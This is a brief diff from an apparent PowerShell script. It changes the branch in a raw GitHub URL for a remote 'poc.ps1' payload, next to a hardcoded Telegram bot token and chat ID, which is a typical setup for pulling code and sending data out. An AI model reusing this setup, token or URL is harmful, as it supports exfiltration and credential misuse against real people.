@@ -21,7 +21,7 @@ BOT TELEGRAM:
 
 $BotToken = "6630869064:AAHFU-v8wHKuMjNhhED-Z967JUcRTSM86tM"
 $ChatID = '5197803637'
-$githubScript = 'https://raw.githubusercontent.com/codexpuz/lol/master/poc.ps1'
+$githubScript = 'https://raw.githubusercontent.com/codexpuz/lol/main/poc.ps1'
 
 
 ###############
